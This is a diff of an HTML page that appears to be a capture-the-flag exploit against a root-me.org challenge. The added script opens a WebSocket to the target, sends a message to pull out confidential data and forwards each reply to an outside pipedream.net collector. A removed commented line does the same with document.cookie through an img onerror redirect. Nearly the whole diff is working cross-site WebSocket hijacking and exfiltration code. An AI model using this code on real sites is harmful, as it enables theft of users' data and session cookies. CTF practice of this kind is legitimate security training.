@@ -1,9 +1,32 @@
 <!DOCTYPE html>
-<!--<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
+
+<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
 <META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf20.root-me.org/room">
--->
+
+<script>
+	var ws = new WebSocket('ws://ctf20.root-me.org/ws');
+	ws.onopen = start
+	ws.onmessage = handleReply
+	function start(event) {
+	  ws.send('hello'); //Send the message to retreive confidential information
+	}
+	function handleReply(event) {
+	  //Exfiltrate the confidential information to attackers server
+	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
+	}
+</script>
+
+
+<!--
+
+<!DOCTYPE html>
+
+
 <meta http-equiv="Content-Security-Policy" content="*">
 <meta http-equiv="Access-Control-Allow-Origin" content="*">
+
+<meta http-equiv="Content-Security-Policy" content="default-src * data: mediastream: blob: filesystem: about: ws: wss: 'unsafe-eval' 'wasm-unsafe-eval' 'unsafe-inline'; connect-src * data: blob: 'unsafe-inline';">
+<META HTTP-EQUIV="Access-Control-Allow-Origin" CONTENT="http://ctf20.root-me.org/room">
 <p id="para"></p></body>
         <script>
         var iframe = document.createElement('iframe');
@@ -77,10 +100,9 @@
 	  //Exfiltrate the confidential information to attackers server
 	  fetch('https://en6gc9c8vfzvo.x.pipedream.net/?abc='+event.data, {mode: 'no-cors'})
 }">
-<!--
+
 <iframe src="http://ctf20.root-me.org/room" height="500" width="800" ></iframe>
--->
-<!--<img src=x onerror="window.location.href='https://en6gc9c8vfzvo.x.pipedream.net?imageError' + document.cookie"> -->
+
 <script>
 /*
 function sleep(ms) {
